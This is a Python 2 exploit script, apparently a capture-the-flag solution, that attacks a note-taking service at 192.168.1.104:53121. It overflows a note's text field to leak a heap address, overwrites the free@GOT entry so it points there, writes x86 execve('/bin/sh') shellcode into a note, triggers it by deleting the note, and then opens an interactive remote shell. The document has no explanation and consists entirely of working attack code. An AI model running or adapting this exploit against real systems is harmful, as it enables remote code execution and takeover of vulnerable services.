import socket
import struct

IP="192.168.1.104"
PORT=53121
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def run(data, result=None):
    if data:
        s.send(data+"\n")

    while result and not result in s.recv(1024):
        pass

def resolve_address():
    data = s.recv(1024)
    return struct.unpack("I", data[93:97])[0] - 88

print("[*] Init")
run(None, "> ")

print("[*] Creating two notes")
run("new", "> ")
run("new", "> ")

print("[*] Leaking heap location")
payload = "A"*76

run("set", "> id: ")
run("0", "> text(32 max): ")
run(payload, "> ")

run("show", "> id: ")
run("0")

address = resolve_address()
print("[*] Address founded: %s" % hex(address))

print("[*] Overwrite free@GOT")
payload = "A"*76 + struct.pack("<I", 0x0804a378)
location = struct.pack("<I", address)

run("set", "> id: ")
run("0", "> text(32 max): ")
run(payload, "> ")
run("set", "> id: ")
run("1", "> text(32 max): ")
run(location, "> ")

print("[*] Write shellcode")
shellcode = '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'

run("set", "> id: ")
run("0", "> text(32 max): ")
run(shellcode, "> ")

run("del", "> id: ")
run("0")

run("echo [*] 0wn3d!")

while True:
    print(s.recv(2048))
    d = raw_input("$ ")
    s.send(d+"\n")